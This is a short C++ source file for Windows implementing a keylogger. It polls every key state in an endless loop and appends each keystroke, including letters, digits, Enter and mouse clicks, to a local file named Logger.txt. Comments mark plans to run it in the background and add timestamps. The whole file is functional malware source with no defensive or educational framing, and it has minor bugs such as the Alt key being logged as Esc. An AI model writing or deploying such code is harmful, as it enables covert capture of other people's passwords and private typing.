#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <time.h>
#include <conio.h>
#include <fstream>

using namespace std;

int main() {
//	add time and date 
//	run in background
	while(1){
		Sleep(10);
		for(int i = 8; i<=222; i++){
		if(GetAsyncKeyState(i) == -32767){
			ofstream write ("Logger.txt", ios::app);
			switch (i){
			case VK_BACK:
				write << "<Backspace>";
				break;
			case VK_TAB:
				write << "<Tab>";
				break;
			case VK_ESCAPE:
				write << "<Esc>";
				break;
			case VK_SPACE:
				write << " ";
				break;
			case VK_DELETE:
				write << "<Delete>";
				break;
			case VK_RETURN:
				write << "<Enter>";
				break;
			case VK_SHIFT:
				write << "<Shift>";
				break;
			case VK_CAPITAL:
				write << "<Caps>";
				break;
			case VK_CONTROL:
				write << "<Ctrl>";
				break;
			case VK_MENU:
				write << "<Esc>";
				break;
			case VK_LEFT:
				write << "<Left key>";
				break;
			case VK_RIGHT:
				write << "<Right key>";
				break;
			case VK_UP:
				write << "<Up key>";
				break;
			case VK_DOWN:
				write << "<Down key>";
				break;
			case VK_VOLUME_DOWN:
				write <<"<Volume Down>";
				break;
			case VK_VOLUME_UP:
				write << "<Volume Up>";
				break;
			case VK_LBUTTON:
				write << "<Left mouse button>";
				break;
			case VK_RBUTTON:
				write << "<Right mouse button>";
				break;

			// f1-> f12
			default:{
				//lower case
				if(i > 64 && i < 91 && !GetAsyncKeyState(0x10)){
					i = i + 32;
					write << (char) i;
					write.close();
					break;
				}// upper case
				else if(i > 64 && i < 91){
					write << (char) i;
					write.close();
					break;
				}//48-57 0-9
				else if (i >= 48 && i <= 57){
				write << i - 48;
				write.close();
				}
				}
			}
			}
		}
	}
	return 0;
}
